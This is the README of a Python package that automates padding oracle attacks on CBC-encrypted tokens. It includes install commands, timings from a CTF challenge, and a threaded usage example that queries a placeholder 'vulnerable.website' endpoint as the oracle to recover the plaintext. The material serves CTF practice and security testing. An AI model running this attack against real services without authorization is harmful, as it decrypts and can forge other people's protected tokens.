# padding_oracle.py

![python-package-badge](https://github.com/djosix/padding_oracle.py/actions/workflows/python-package.yml/badge.svg)

Fast threaded [padding oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack) attack automation script for Python 3.

## Install

PyPI:

```shell
pip3 install -U padding_oracle
```

GitHub:

```shell
pip3 install -U git+https://github.com/djosix/padding_oracle.py.git
```

## Performance

Tested on [0x09] Cathub Party from EDU-CTF:

| Request Threads | Execution Time |
|-----------------|----------------|
| 1               | 17m 43s        |
| 4               | 5m 23s         |
| 16              | 1m 20s         |
| 64              | 56s            |

## Usage

E.g. testing `https://vulnerable.website/api/?token=M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94%3D`:

```python
from padding_oracle import padding_oracle, base64_encode, base64_decode
import requests

sess = requests.Session() # use connection pool
url = 'https://vulnerable.website/api/'

def oracle(ciphertext: bytes):
    resp = sess.get(url, params={'token': base64_encode(ciphertext)})

    if 'failed' in resp.text:
        return False # e.g. token decryption failed
    elif 'success' in resp.text:
        return True
    else:
        raise RuntimeError('unexpected behavior')

ciphertext: bytes = base64_decode('M9I2K9mZxzRUvyMkFRebeQzrCaMta83eAE72lMxzg94=')
# len(ciphertext) is 32
# possibly be "IV + cipher block" if block size is 16

assert len(ciphertext) % 16 == 0

plaintext = padding_oracle(
    ciphertext,
    block_size = 16,
    oracle = oracle,
    num_threads = 16,
)
```

This package also provides PHP-like encoding/decoding functions:

```python
from padding_oracle.encoding import (
    urlencode,
    urldecode,
    base64_encode,
    base64_decode,
)
```

## License

This project is licensed under the terms of the MIT license.

<!-- PiuPiuPiu -->
